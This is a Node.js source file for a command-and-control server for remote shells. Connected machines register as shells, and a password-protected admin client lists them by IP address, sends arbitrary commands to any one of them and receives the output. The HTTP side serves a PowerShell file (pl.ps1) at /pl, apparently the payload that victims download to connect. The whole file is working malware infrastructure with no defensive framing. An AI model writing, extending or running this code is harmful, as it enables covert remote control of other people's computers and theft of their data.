const WebSocket = require('ws')
var config = require('./config.json');
const wss = new WebSocket.Server({
    port: config.websocketPort
})
wss.getUniqueID = function() { //https://stackoverflow.com/a/46878342
    function s4() {
        return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
    }
    return s4() + s4() + '-' + s4();
};
wss.BroadcastConnected = function() {
    wss.clients.forEach(function(client) {
        if (client.ident == "admin") {
            var clientsList = {};
            clientsList['cmd'] = 'connected_users';
            clientsList['connected'] = {};
            wss.clients.forEach(function(client2) {
                if (client2.ident == "shell") {
                    clientsList['connected'][client2.id] = client2._socket.remoteAddress;
                }
            });
            client.send(JSON.stringify(clientsList));
        }
    });
}
wss.on('connection', function connection(ws) {
    console.log('Client connected')
    console.log(ws._socket.remoteAddress);
    ws.id = wss.getUniqueID();
    ws.on("message", function message(message) {
        // console.log(ws._socket.remoteAddress + " >> " + message);
        try {
            const obj = JSON.parse(message);
            //console.log(ws.id + " >> " + message + " >> " + ws.ident);
            if (obj.cmd == "connect_admin") {
                if (obj.password == config.password) {
                    ws.ident = "admin";
                    ws.send("Connected as admin!");
                    wss.BroadcastConnected();
                } else {
                    var invalid = {};
                    invalid['cmd'] = 'password_invalid';
                    invalid['data'] = "Invalid password!";
                    ws.send(JSON.stringify(invalid));
                }
            } else if (obj.cmd == "connect_shell") {
                ws.id += "_" + obj.data;
                ws.ident = "shell";
                wss.BroadcastConnected();
            } else if (obj.cmd == "execute" && ws.ident == "admin") {
                wss.clients.forEach(function(client) {
                    if (obj.target == client.id) {
                        console.log("Sending cmd to target: " + obj.target + " >> " + obj.cmd2);
                        client.send(obj.cmd2);
                    }
                });
            } else if (obj.cmd == "cmd_response" && ws.ident == "shell") {
                wss.clients.forEach(function(client) {
                    if (client.ident == "admin") {
                        obj.client = ws.id;
                        client.send(JSON.stringify(obj));
                    }
                });
            }
        } catch (e) {}
    });
    ws.on("close", () => {
        console.log("Client disconnected");
        ws.ident = "";
        wss.BroadcastConnected();
    });
    ws.onerror = function() {
        console.log("Some Error occurred");
        wss.BroadcastConnected();
    }
});
const http = require("http");
const fs = require('fs').promises;

function setUserPage(filename, res, content_type) {
    fs.readFile(__dirname + filename).then(contents => {
        res.setHeader("Content-Type", content_type);
        res.writeHead(200);
        res.end(contents);
    }).catch(err => {
        res.writeHead(500);
        res.end(err);
        return;
    });
}
const requestListener = function(req, res) {
    console.log(req.url);
    if (req.url == "/css.css") {
        setUserPage("/css.css", res, "text/css");
    } else if (req.url == "/shell.socket") {
        setUserPage("/index.html", res, "text/html");
    } else if (req.url == "/socket.js") {
        setUserPage("/socket.js", res, "text/javascript");
    } else if (req.url == "/pl") {
        setUserPage("/pl.ps1", res, "application/octet-stream");
    } else {
        res.writeHead(404);
        res.end("");
    }
};
const server = http.createServer(requestListener);
server.listen(config.httpPort, '', () => {
    console.log(`HTTP server is running`);
});